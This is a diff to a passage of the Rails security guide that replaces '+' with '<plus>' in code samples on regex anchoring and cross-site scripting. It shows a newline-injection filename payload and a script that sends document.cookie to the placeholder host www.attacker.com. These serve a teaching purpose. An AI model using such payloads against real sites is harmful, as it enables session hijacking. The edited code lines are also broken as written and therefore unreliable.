@@ -582,7 +582,7 @@ Ruby uses a slightly different approach than many other languages to match the e
 
 <ruby>
 class File < ActiveRecord::Base
-  validates :name, :format => /^[\w\.\-\+]+$/
+  validates :name, :format => /^[\w\.\-\<plus>]<plus>$/
 end
 </ruby>
 
@@ -595,7 +595,7 @@ file.txt%0A<script>alert('hello')</script>
 Whereas %0A is a line feed in URL encoding, so Rails automatically converts it to "file.txt\n&lt;script&gt;alert('hello')&lt;/script&gt;". This file name passes the filter because the regular expression matches – up to the line end, the rest does not matter. The correct expression should read:
 
 <ruby>
-/\A[\w\.\-\+]+\z/
+/\A[\w\.\-\<plus>]<plus>\z/
 </ruby>
 
 h4. Privilege Escalation
@@ -762,7 +762,7 @@ These examples don't do any harm so far, so let's see how an attacker can steal 
 For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victim's cookie.
 
 <html>
-<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+<script>document.write('<img src="http://www.attacker.com/' <plus> document.cookie <plus> '">');</script>
 </html>
 
 The log files on www.attacker.com will read like this:
